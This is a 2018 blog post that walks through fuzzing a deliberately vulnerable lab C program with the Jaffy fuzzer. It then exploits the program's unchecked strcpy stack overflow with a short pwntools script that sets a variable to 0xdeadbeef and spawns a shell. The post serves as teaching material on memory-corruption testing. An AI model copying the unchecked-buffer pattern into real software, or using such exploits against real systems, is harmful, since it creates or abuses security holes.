<!DOCTYPE html>
<html lang="en"><head>
	<meta charset="utf-8">
	<meta name="description" content=''>
	<meta name="keywords" content=''>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" href='https://www.vishalmishra.in/css/bootstrap.min.css'>
	<title>CLI Security Testing: Stack Smashing</title>
	<nav class="navbar text-center sticky-top bg-white mt-2 mb-1">
		<a href='https://www.vishalmishra.in/'><span class="btn btn-sm btn-outline-primary">Home</span></a>
		<a href='https://www.vishalmishra.in/about'><span class="btn btn-sm btn-outline-secondary">About</span></a>
		<a href='https://www.vishalmishra.in/post'><span class="btn btn-sm btn-outline-success">Blog</span></a>
		<a href='https://www.vishalmishra.in/tags'><span class="btn btn-sm btn-outline-warning">Tags</span></a>
	</nav>
</head>
<body>
      <div id="content">


	<section class="container text-monospace text-justified mt-3">
	  <h2>CLI Security Testing: Stack Smashing</h2>
	  <small class="text-secondary mb-5">Posted on January 4, 2018 | 2 minute read</small>
	  <p><h2 id="fuzzing-command-line-utilities">Fuzzing Command Line Utilities</h2>
<p>Following up from one of my previous <a href="https://www.vishalmishra.in/post/cli-security-testing/">article</a>, I will be fuzzing CLI params using JAFFY fuzzer and try to smash the stack on a vulnerable program.<br>
Jaffy can fuzz binaries that you run on the command line. It takes a simple XML as input to specify the arguments details and you are ready to go.
In order to run jaffy you need to install this python3 module:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pip install untangled
</code></pre></div><p>Jaffy runs everything with shell=True so it makes it vary easy to use it with command line utilities. All file output is stored in a folder with the date and time of the scan.</p>
<p>Let's have a look at out vulnerable program beofre jumping to video:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">shell</span>()
{
	printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">You did it.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
	system(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#34;</span>);
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span> argv)
{
	<span style="color:#66d9ef">if</span>(argc <span style="color:#f92672">!</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>)
	{
		printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">usage:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s string</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
		<span style="color:#66d9ef">return</span> EXIT_FAILURE;
	}

	<span style="color:#66d9ef">int</span> set_me <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
	<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">15</span>];
	strcpy(buf, argv[<span style="color:#ae81ff">1</span>]);

	<span style="color:#66d9ef">if</span>(set_me <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>)
	{
		shell();
	}
	<span style="color:#66d9ef">else</span>
	{
		printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Not authenticated.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">set_me was %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, set_me);
	}

	<span style="color:#66d9ef">return</span> EXIT_SUCCESS;
}
</code></pre></div><p>By now you may have found out that it is doing a vulnerbale string copy (strcpy) and writing anything recieved from command line argument without doing a length check, that too on a limited space buffer of 15 characters.</p>
<p>Now lets have a look at out XML file for jaffy:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-XML" data-lang="XML"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
<span style="color:#f92672">&lt;fuzzer</span><span style="color:#f92672">&gt;</span>
	<span style="color:#f92672">&lt;bin</span> <span style="color:#a6e22e">path=</span><span style="color:#e6db74">&#34;/home/kowalski/0x51/lab2C&#34;</span> <span style="color:#f92672">/&gt;</span>
	<span style="color:#f92672">&lt;opt</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;prestatic&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">/&gt;</span>
	<span style="color:#f92672">&lt;opt</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;poststatic&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">/&gt;</span> 
	<span style="color:#f92672">&lt;fuzz</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;chariter&#34;</span> <span style="color:#a6e22e">prefix=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">char=</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#a6e22e">length=</span><span style="color:#e6db74">&#34;9999&#34;</span> <span style="color:#f92672">/&gt;</span>
	<span style="color:#f92672">&lt;prefuzz</span> <span style="color:#a6e22e">cmd=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">/&gt;</span>
	<span style="color:#f92672">&lt;postfuzz</span> <span style="color:#a6e22e">cmd=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">/&gt;</span>
	<span style="color:#f92672">&lt;exit</span> <span style="color:#a6e22e">level=</span><span style="color:#e6db74">&#34;!0&#34;</span> <span style="color:#a6e22e">cmd=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">/&gt;</span>
	<span style="color:#f92672">&lt;display</span> <span style="color:#a6e22e">level=</span><span style="color:#e6db74">&#34;!0&#34;</span> <span style="color:#f92672">/&gt;</span>
	<span style="color:#f92672">&lt;write</span> <span style="color:#a6e22e">level=</span><span style="color:#e6db74">&#34;!0&#34;</span> <span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;/fuzzer&gt;</span>
</code></pre></div><p style="text-align:center" >
<script src="https://asciinema.org/a/2V9j0XYxn7tOR8uTtV83sXRkf.js" data-speed="2" id="asciicast-2V9j0XYxn7tOR8uTtV83sXRkf" async></script></p>
<p style="text-align:center" ><strong>Video: Fuzzing Command Line Utilities</strong></p>
<p>As expected this program is vulnerable. Though while compiling I have only removed the canary protection on 17.10 ubuntu, rest all other security check are active. I will try to cover canary bypass in upcoming article.</p>
<p><strong>NX        : <span style="background-color: #98FB98">ENABLED</span> <br>
PIE       : <span style="background-color: #98FB98">ENABLED</span><br>
RELRO     : <span style="background-color: #98FB98">FULL</span><br>
CANARY    : <span style="background-color: #FF0000">DISABLED</span><br></strong></p>
<p>Now lets go and see with help of pwntools and peda how easily we can prepare exploit for this elf.</p>
<p style="text-align:center" >
<script src="https://asciinema.org/a/iOvLGdVDuaDXHxVhQVklihS1G.js" data-speed="3" id="asciicast-iOvLGdVDuaDXHxVhQVklihS1G" async></script></p>
<p style="text-align:center" ><strong>Video: Stack Smashing</strong></p>
<h2 id="exploit">Exploit</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

<span style="color:#75715e">#Exploit</span>
padding <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">15</span>
pwn <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)
payload<span style="color:#f92672">=</span>padding<span style="color:#f92672">+</span>pwn

<span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74"># Sending</span><span style="color:#e6db74">&#39;</span>
<span style="color:#66d9ef">print</span> payload
p <span style="color:#f92672">=</span> process([<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./lab2Cm32</span><span style="color:#e6db74">&#39;</span>,padding<span style="color:#f92672">+</span>pwn])
p<span style="color:#f92672">.</span>interactive()
</code></pre></div><p><img src="https://www.vishalmishra.in/media/pwntoolExploit.gif" alt=" Pwntool Exploit in Action"></p>
<h5 id="references"><strong>References</strong>:</h5>
<ol>
<li><a href="https://github.com/pr1ntf/jaffy">GitHub</a></li>
</ol>
</p>
	  <code>tags:<span class='badge badge-dark'><a class='text-white' href='https://www.vishalmishra.in/tags/security%20testing'>Security Testing</a></span>
	  <span class='badge badge-dark'><a class='text-white' href='https://www.vishalmishra.in/tags/0-day'>0-day</a></span>
	  <span class='badge badge-dark'><a class='text-white' href='https://www.vishalmishra.in/tags/fuzzing'>Fuzzing</a></span>
	  <span class='badge badge-dark'><a class='text-white' href='https://www.vishalmishra.in/tags/memory%20corruption'>Memory Corruption</a></span>
	  <span class='badge badge-dark'><a class='text-white' href='https://www.vishalmishra.in/tags/cli'>CLI</a></span>
	  
	  </code>
	  <div class="container mt-2" id="comments">
	    
		<small class="mt-1">Please mail your comments to <a href="vishal_mishra@live.com">vishal_mishra@live.com</a></small><br>
	    
	  </div>
	</section>



      </div>
  </body><footer>
  <div class="container-fluid bg-dark text-white text-monospace text-center mt-4">
    <small> | Powered by <a href="https://gohugo.io">Hugo</a></small>
  </div>
  
</footer>
</html>
